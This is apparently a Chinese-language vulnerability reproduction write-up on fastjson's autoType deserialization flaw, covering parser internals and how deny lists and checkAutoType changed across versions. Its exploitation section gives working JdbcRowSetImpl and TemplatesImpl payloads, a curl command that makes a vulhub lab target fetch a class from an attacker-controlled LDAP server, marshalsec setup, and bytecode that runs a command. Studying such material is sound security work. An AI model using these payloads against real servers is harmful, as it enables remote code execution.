# 漏洞复现与分析——fastjson反序列化漏洞

## 概述

Fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。Fastjson已经被广泛使用在各种场景，包括cache存储、RPC通讯、MQ通讯、网络协议通讯、Android客户端、Ajax服务器处理程序等等。

应用示例：将 Java 对象转换为 JSON 格式，首先定义以下 Person JavaBean:

```java
package fastjsonexample;
import com.alibaba.fastjson.JSON;

public class Person {
     
    @JSONField(name = "AGE")
    private int age;
 
    @JSONField(name = "FULL NAME")
    private String fullName;
 
    @JSONField(name = "DATE OF BIRTH")
    private Date dateOfBirth;
 
    public Person(int age, String fullName, Date dateOfBirth) {
        super();
        this.age = age;
        this.fullName= fullName;
        this.dateOfBirth = dateOfBirth;
    }
 
    // 标准 getters & setters
}
```

可以使用 JSON.toJSONString() 将 Java 对象转换换为 JSON 对象：
```java
private List<Person> listOfPersons = new ArrayList<Person>();
 
@Before
public void setUp() {
    listOfPersons.add(new Person(15, "John Doe", new Date()));
    listOfPersons.add(new Person(20, "Janette Doe", new Date()));
}
 
@Test
public void whenJavaList_thanConvertToJsonCorrect() {
    String jsonOutput= JSON.toJSONString(listOfPersons);
}
```
输出结果为：
```
[  
    {  
        "AGE":15,
        "DATE OF BIRTH":1468962431394,
        "FULL NAME":"John Doe"
    },
    {  
        "AGE":20,
        "DATE OF BIRTH":1468962431394,
        "FULL NAME":"Janette Doe"
    }
]
```

这便是序列化的过程，下面的示例为反序列化。可以使用 JSON.parseObject() 将 JSON 字符串转换为 Java 对象。注意反序列化时为对象时，必须要有默认无参的构造函数，否则会报异常:

```java
@Test
public void whenJson_thanConvertToObjectCorrect() {
    Person person = new Person(20, "John", "Doe", new Date());
    String jsonObject = JSON.toJSONString(person);
    Person newPerson = JSON.parseObject(jsonObject, Person.class);
     
    assertEquals(newPerson.getAge(), 0); // 如果我们设置系列化为 false
    assertEquals(newPerson.getFullName(), listOfPersons.get(0).getFullName());
}
```


总得来看，对开发人员只需要考虑fastjson提供的几个静态方法即可：
- JSON.toJSONString()
- JSON.parse()
- JSON.parseObject()

Fastjson的主要功能都是在 DefaultJSONParser类中实现的，在这个类中会应用其它的一些外部类完成后续操作；ParserConfig 主要是进行配置信息的初始化，JSONLexer 主要是对json字符串进行处理并分析，反序列化在JavaBeanDeserializer中处理。


假设传入的json字串为:
```json
{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://asdfasfd/","autoCommit":true}},age:11}
```

那么反序列化过程分为4步：
- DefaultJSONParser的初始化
- parseObject()检查是否指定了第二个参数，即是否指定了class。
  - 如果指定了class字段，则首先根据class类型来获取相应deserializer，如果不是initDeserializers中的类的话，则会调用JavaBeanDeserializer#deserialze转交FastjsonASMDeserializer，利用Fastjson自己实现的ASM流程生成处理类，调用相应的类并将处理流程转交到相应的处理类处理json字符串内容。
  - 如果未指定，则直接交给StringCodec类来处理json字符串。
- 最终都转交由DefaultJSONParser#parse中根据lexer.token来选择处理方式，这里的例子中都为12也就是{（因为要处理json字符串需要一个起始标志位，所以判断当前json字符串的token是很重要的），接下来就是对json字符串进行处理（这里是一个循环处理，摘取类似"name":"123"这样的关系）。
- 判断解析的JSON字符串是否存在symbolTable中的字段，例如@type，$ref这样的字段，如果出现了@type则交由public final Object parseObject(final Map object,Object fieldName)来处理，然后重复步骤2直到成功或报错。

具体可参考：https://paper.seebug.org/994/

动态调试技术可参考：https://tech.meituan.com/2019/11/07/java-dynamic-debugging-technology.html


### fastjson漏洞历史

Fastjson是alibaba的开源，所以没有cve编号，时间线不清晰，但根据历史版本和相应漏洞还是有一定线索。

#### Fastjson反序列化漏洞的根源

“fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链”。

#### Fastjson RCE关键函数
- DefaultJSONParser. parseObject() 解析传入的 json 字符串提取不同的 key 进行后续的处理
- TypeUtils. loadClass() 根据传入的类名，生成类的实例
- JavaBeanDeserializer.Deserialze() 依次调用 @type 中传入类的对象公有 set\get\is 方法。
- ParserConfig.checkAutoType() 阿里后续添加的防护函数，用于在 loadclass 前检查传入的类是否合法。

## 测试
### 测试样例

```java

//User.java
package com.longofo.test;

public class User {
    private String name; //私有属性，有getter、setter方法
    private int age; //私有属性，有getter、setter方法
    private boolean flag; //私有属性，有is、setter方法
    public String sex; //公有属性，无getter、setter方法
    private String address; //私有属性，无getter、setter方法

    public User() {
        System.out.println("call User default Constructor");
    }

    public String getName() {
        System.out.println("call User getName");
        return name;
    }

    public void setName(String name) {
        System.out.println("call User setName");
        this.name = name;
    }

    public int getAge() {
        System.out.println("call User getAge");
        return age;
    }

    public void setAge(int age) {
        System.out.println("call User setAge");
        this.age = age;
    }

    public boolean isFlag() {
        System.out.println("call User isFlag");
        return flag;
    }

    public void setFlag(boolean flag) {
        System.out.println("call User setFlag");
        this.flag = flag;
    }

    @Override
    public String toString() {
        return "User{" +
                "name='" + name + '\'' +
                ", age=" + age +
                ", flag=" + flag +
                ", sex='" + sex + '\'' +
                ", address='" + address + '\'' +
                '}';
    }
}
```

下面使用4种方式解析json串：

```java
package com.longofo.test;

import com.alibaba.fastjson.JSON;

public class Test1 {
    public static void main(String[] args) {
        //序列化
        String serializedStr = "{\"@type\":\"com.longofo.test.User\",\"name\":\"lala\",\"age\":11, \"flag\": true,\"sex\":\"boy\",\"address\":\"china\"}";//
        System.out.println("serializedStr=" + serializedStr);

        System.out.println("-----------------------------------------------\n\n");
        //1.通过parse方法进行反序列化，返回的是一个JSONObject]
        System.out.println("JSON.parse(serializedStr)：");
        Object obj1 = JSON.parse(serializedStr);
        System.out.println("parse反序列化对象名称:" + obj1.getClass().getName());
        System.out.println("parse反序列化：" + obj1);
        System.out.println("-----------------------------------------------\n");

        //2.通过parseObject,不指定类，返回的是一个JSONObject
        System.out.println("JSON.parseObject(serializedStr)：");
        Object obj2 = JSON.parseObject(serializedStr);
        System.out.println("parseObject反序列化对象名称:" + obj2.getClass().getName());
        System.out.println("parseObject反序列化:" + obj2);
        System.out.println("-----------------------------------------------\n");

        //3.通过parseObject,指定为object.class
        System.out.println("JSON.parseObject(serializedStr, Object.class)：");
        Object obj3 = JSON.parseObject(serializedStr, Object.class);
        System.out.println("parseObject反序列化对象名称:" + obj3.getClass().getName());
        System.out.println("parseObject反序列化:" + obj3);
        System.out.println("-----------------------------------------------\n");

        //4.通过parseObject,指定为User.class
        System.out.println("JSON.parseObject(serializedStr, User.class)：");
        Object obj4 = JSON.parseObject(serializedStr, User.class);
        System.out.println("parseObject反序列化对象名称:" + obj4.getClass().getName());
        System.out.println("parseObject反序列化:" + obj4);
        System.out.println("-----------------------------------------------\n");
    }
}
```

说明：
- 这里的`@type`就是对应常说的autotype功能，简单理解为fastjson会自动将json的key:value值映射到`@type`对应的类中
- 样例User类的几个方法都是比较普通的方法，命名、返回值也都是常规的符合bean要求的写法，所以下面的样例测试有的特殊调用不会覆盖到，但是在漏洞分析中，可以看到一些特殊的情况
- parse用了四种写法，四种写法都能造成危害（不过实际到底能不能利用，还得看版本和用户是否打开了某些配置开关，具体往后看）
- 样例测试都使用jdk8u102，代码都是拉的源码测，主要是用样例说明autotype的默认开启、checkautotype的出现、以及黑白名白名单从哪个版本开始出现的过程以及增强手段

### fastjson v1.1.157

引入这个版本的fastjson后，测试结果如下：

```
serializedStr={"@type":"com.longofo.test.User","name":"lala","age":11, "flag": true,"sex":"boy","address":"china"}
-----------------------------------------------


JSON.parse(serializedStr)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parse反序列化对象名称:com.longofo.test.User
parse反序列化：User{name='lala', age=11, flag=true, sex='boy', address='null'}
-----------------------------------------------

JSON.parseObject(serializedStr)：
call User default Constructor
call User setName
call User setAge
call User setFlag
call User getAge
call User isFlag
call User getName
parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject
parseObject反序列化:{"flag":true,"sex":"boy","name":"lala","age":11}
-----------------------------------------------

JSON.parseObject(serializedStr, Object.class)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parseObject反序列化对象名称:com.longofo.test.User
parseObject反序列化:User{name='lala', age=11, flag=true, sex='boy', address='null'}
-----------------------------------------------

JSON.parseObject(serializedStr, User.class)：
call User default Constructor
call User setName
call User setAge
call User setFlag
parseObject反序列化对象名称:com.longofo.test.User
parseObject反序列化:User{name='lala', age=11, flag=true, sex='boy', address='null'}
-----------------------------------------------
```

#### 分析
##### JSON.parse(serializedStr)
- 在指定了@type的情况下，自动调用了User类默认构造器、User类对应的setter方法（setAge，setName）,最终结果是User类的一个实例；
  
- public sex被成功赋值；
- private address没有成功赋值。（在1.2.22, 1.1.54.android之后，增加了一个SupportNonPublicField特性，如果使用了这个特性，那么private address就算没有setter、getter也能成功赋值，这个特性也与后面的一个漏洞有关）。

- 注意默认构造方法、setter方法调用顺序，默认构造器在前，此时属性值还没有被赋值，所以即使默认构造器中存在危险方法，但是危害值还没有被传入，所以默认构造器按理来说不会成为漏洞利用方法，不过对于内部类那种，外部类先初始化了自己的某些属性值，但是内部类默认构造器使用了父类的属性的某些值，依然可能造成危害。

- 可见fastjson，最原始的版本就开始有autotype功能了，并且autotype默认开启。同时ParserConfig类中还没有黑名单。


#### JSON.parseObject(serializedStr)

- 在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法（setAge，setName）以及对应的getter方法（getAge，getName），最终结果是一个字符串。
- 这里还多调用了getter（注意bool类型的是is开头的）方法，是因为parseObject在没有其他参数时，调用了JSON.toJSON(obj)，后续会通过gettter方法获取obj属性值：

#### JSON.parseObject(serializedStr, Object.class)
在指定了@type的情况下，这种写法和第一种JSON.parse(serializedStr)写法其实没有区别的，从结果也能看出。
#### JSON.parseObject(serializedStr, User.class)
在指定了@type的情况下，自动调用了User类默认构造器，User类对应的setter方法（setAge，setName），最终结果是User类的一个实例。这种写法明确指定了目标对象必须是User类型，如果@type对应的类型不是User类型或其子类，将抛出不匹配异常，但是，就算指定了特定的类型，依然有方式在类型匹配之前来触发漏洞。

### fastjson v1.2.10 -v1.2.24
测试结果和1.1.157一样.

这个版本autotype依然默认开启。不过从这个版本开始，fastjson在 `ParserConfig` 中加入了 `denyList` ，一直到1.2.24版本，这个`denyList`都只有一个类`java.lang.Thread`(但不能用于漏洞利用）。

### fastjson v1.2.25

执行测试，结果是抛出出了异常：

```
serializedStr={"@type":"com.longofo.test.User","name":"lala","age":11, "flag": true}
-----------------------------------------------


JSON.parse(serializedStr)：
Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. com.longofo.test.User
    at com.alibaba.fastjson.parser.ParserConfig.checkAutoType(ParserConfig.java:882)
    at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:322)
    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1327)
    at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1293)
    at com.alibaba.fastjson.JSON.parse(JSON.java:137)
    at com.alibaba.fastjson.JSON.parse(JSON.java:128)
    at com.longofo.test.Test1.main(Test1.java:14)
```

- 从1.2.25开始， `autotype` 默认关闭了。
- 从1.2.25开始，增加了 `checkAutoType` 函数，它的主要作用是检测`@type`指定的类是否在白名单、黑名单（使用的`startswith`方式）以及目标类是否是两个危险类（`Classloader`、`DataSource`）的子类或者子接口，其中白名单优先级最高，白名单如果允许就不检测黑名单与危险类，否则继续检测黑名单与危险类.

- 增加了黑名单类、包数量，同时增加了白名单，用户还可以调用相关方法添加黑名单/白名单到列表中
- 后面的许多漏洞都是对checkAutotype以及本身某些逻辑缺陷导致的，随之而来的补丁就是修复这些逻辑缺陷以及黑名单的不断增加。

### fastjson 1.2.42

与1.2.25一样，默认不开启autotype，所以结果一样，直接抛autotype未开启异常。

从这个版本开始，将denyList、acceptList换成了十进制的hashcode，使得安全研究难度变大了（不过hashcode的计算方法依然是公开的。例如某个项目可能拥有大量的jar包，从maven仓库可以下载jar包，可批量的跑类名、包名，不过对于黑名单是包名的情况，要找到具体可利用的类也会消耗一些时间。

checkAutotype中检测也做了相应的修改。

### fastjson 1.2.61
与1.2.25一样，默认不开启autotype，所以结果一样，直接抛autotype未开启异常。

在1.2.61版本时，fastjson将hashcode从十进制换成了十六进制，不过用十六进制表示与十进制表示都一样，同样可以批量跑jar包。在1.2.62版本为了统一又把十六进制大写。再之后的版本就是黑名单的增加了

## 漏洞利用

下面给出那会比较经典的几个payload。

### com.sun.rowset.JdbcRowSetImpl利用链

触发漏洞方式：
- 从json字串生成JdbcRowSetImpl对象
- 调用setDataSourceName方法
- 调用setAutocommit方法
- 调用context.lookup(datasourceName)方法
- datasource中有恶意代码

#### 方式1
payload：
```
{
  "rand1": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://localhost:1389/Object",
    "autoCommit": true
  }
}
```

测试（jdk=8u102，fastjson=1.2.24）：
```java
package com.longofo.test;

import com.alibaba.fastjson.JSON;

public class Test2 {
    public static void main(String[] args) {
        String payload = "{\"rand1\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Object\",\"autoCommit\":true}}";
//        JSON.parse(payload); 成功
        //JSON.parseObject(payload); 成功
        //JSON.parseObject(payload,Object.class); 成功
        //JSON.parseObject(payload, User.class); 成功，没有直接在外层用@type，加了一层rand:{}这样的格式，还没到类型匹配就能成功触发，这是在xray的一篇文中看到的https://zhuanlan.zhihu.com/p/99075925，所以后面的payload都使用这种模式
    }
}
```
#### 方式2
利用vulhub的fastjson靶场.

先如上例所示，编写一个Touch.java，并编译为Touch.class.

然后启动自己的C2server，使Touch.class可通过http下载 。简单的httpserver 可以在Touch.class目录位置，运行`python -m http.server 8899`，启动一个简单httpserver作测试用。

使用marshalsec对Touch.class进行处理（添加RMIServer实现）：
- 从 github下载marshalsec ,进入所在目录
- 使用maven安装: `mvn clean package -DskipTests`
- 在target目录下找到相应的jar文件
- 使用方法： `java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.<Marshaller> [-a] [-v] [-t] [<gadget_type> [<arguments...>]]`, 
- 此处具体命令： `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://localhost:8899/TouchFile.class" 9999`

使用下列命令上传json: 
`curl http://vulhub-ip:8090/ -H "Content-Type:application/json" --data '{"rand1": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://c2_ip:8899/TouchFile.class","autoCommit": true}}'`


### com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl利用链

触发原因：
- 解析payload后创建TemplatesImpl对象
- 调用JavaBeanDeserializer.deserialze
- 调用FieldDeserializer.setValue
- 调用TemplatesImpl.getOutputProperties
- 调用TemplatesImpl.newTransformer
- 调用TemplatesImpl.getTransletInstance
- 通过defineTransletClasses，newInstance触发我们自己构造的class的静态代码块



payload：
```json
{
  "rand1": {
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": [
      "yv66vgAAADQAJgoAAwAPBwAhBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARBYUFhAQAMSW5uZXJDbGFzc2VzAQAdTGNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMkQWFBYTsBAApTb3VyY2VGaWxlAQAKVGVzdDMuamF2YQwABAAFBwATAQAbY29tL2xvbmdvZm8vdGVzdC9UZXN0MyRBYUFhAQAQamF2YS9sYW5nL09iamVjdAEAFmNvbS9sb25nb2ZvL3Rlc3QvVGVzdDMBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAVAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAFwAYCgAWABkBAARjYWxjCAAbAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAHQAeCgAWAB8BABNBYUFhNzQ3MTA3MjUwMjU3NTQyAQAVTEFhQWE3NDcxMDcyNTAyNTc1NDI7AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcAIwoAJAAPACEAAgAkAAAAAAACAAEABAAFAAEABgAAAC8AAQABAAAABSq3ACWxAAAAAgAHAAAABgABAAAAHAAIAAAADAABAAAABQAJACIAAAAIABQABQABAAYAAAAWAAIAAAAAAAq4ABoSHLYAIFexAAAAAAACAA0AAAACAA4ACwAAAAoAAQACABAACgAJ"
    ],
    "_name": "aaa",
    "_tfactory": {},
    "_outputProperties": {}
  }
}
```
测试（jdk=8u102，fastjson=1.2.24）：
```java
package com.longofo.test;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;

public class Test3 {
    public static void main(String[] args) throws Exception {
        String evilCode_base64 = readClass();
        final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
        String payload = "{'rand1':{" +
                "\"@type\":\"" + NASTY_CLASS + "\"," +
                "\"_bytecodes\":[\"" + evilCode_base64 + "\"]," +
                "'_name':'aaa'," +
                "'_tfactory':{}," +
                "'_outputProperties':{}" +
                "}}\n";
        System.out.println(payload);
        //JSON.parse(payload, Feature.SupportNonPublicField); 成功
        //JSON.parseObject(payload, Feature.SupportNonPublicField); 成功
        //JSON.parseObject(payload, Object.class, Feature.SupportNonPublicField); 成功
        //JSON.parseObject(payload, User.class, Feature.SupportNonPublicField); 成功
    }

    public static class AaAa {

    }

    public static String readClass() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(AaAa.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "AaAa" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
        byte[] evilCode = cc.toBytecode();

        return Base64.encodeBase64String(evilCode);

    }
}
```

简单说明：

这个漏洞需要开启SupportNonPublicField特性，这在样例测试中也说到了。因为TemplatesImpl类中_bytecodes、_tfactory、_name、_outputProperties、_class并没有对应的setter，所以要为这些private属性赋值，就需要开启SupportNonPublicField特性。

具体这个poc构造过程，这里不分析了，可以看下[廖大师傅的这篇](http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/)，涉及到了一些细节问题。

### 未完

https://paper.seebug.org/1192/